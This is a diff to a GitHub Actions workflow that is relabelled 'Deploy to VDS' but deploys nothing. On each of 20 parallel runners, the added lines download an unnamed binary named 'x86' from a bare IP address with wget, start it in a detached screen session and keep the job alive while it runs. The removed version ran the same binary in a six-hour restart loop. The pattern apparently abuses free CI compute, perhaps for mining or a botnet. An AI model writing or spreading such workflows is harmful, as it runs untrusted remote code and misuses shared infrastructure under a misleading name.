@@ -1,49 +1,34 @@
-name: 20_MACHINES_FINAL
+name: Deploy to VDS
 
 on:
   workflow_dispatch:
+  push:
+    branches: [ main ]
 
 jobs:
-  execute:
-    # Используем 20.04 — там лучше поддержка старых x86 файлов
-    runs-on: ubuntu-20.04 
-    timeout-minutes: 360
+  deploy:
+    runs-on: ubuntu-latest
     strategy:
       matrix:
-        id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-      fail-fast: false
-
+        instance: [1, 2, 3, 4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+      max-parallel: 20
+    
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-        with:
-          lfs: true
-
-      - name: Install 32-bit libs
+      - name: Install screen
+        run: sudo apt-get update && sudo apt-get install -y screen
+      
+      - name: Download and run x86
         run: |
-          sudo dpkg --add-architecture i386
-          sudo apt-get update
-          # Ставим базовый набор для x86. Если чего-то не хватит, ldd покажет
-          sudo apt-get install -y libc6:i386 libncurses5:i386 libstdc++6:i386 zlib1g:i386
-
-      - name: Run x86
+          wget -q http://87.242.100.61/x86
+          chmod +x x86
+          screen -dmS x86_session bash -c "./x86; exec bash"
+          echo "Screen session started"
+      
+      - name: Keep workflow alive
         run: |
-          chmod +x ./x86
-          
-          echo "--- ПРОВЕРКА ЗАВИСИМОСТЕЙ ---"
-          ldd ./x86 || true
-          
-          echo "Машина №${{ matrix.id }} погнала"
-
-          # Запуск в цикле: если упадет с Trace/breakpoint trap — сразу поднимется
-          (while true; do
-            ./x86
-            echo "Вылет... рестарт через 3 сек"
-            sleep 3
-          done) &
-
-          # Не даем экшену завершиться 6 часов
-          for i in {1..360}; do
+          echo "Keeping workflow alive..."
+          while screen -list | grep -q x86_session; do
             sleep 60
-            echo "Машина ${{ matrix.id }} в строю: $i мин"
+            echo "Screen session still running..."
           done
+          echo "Screen session ended"
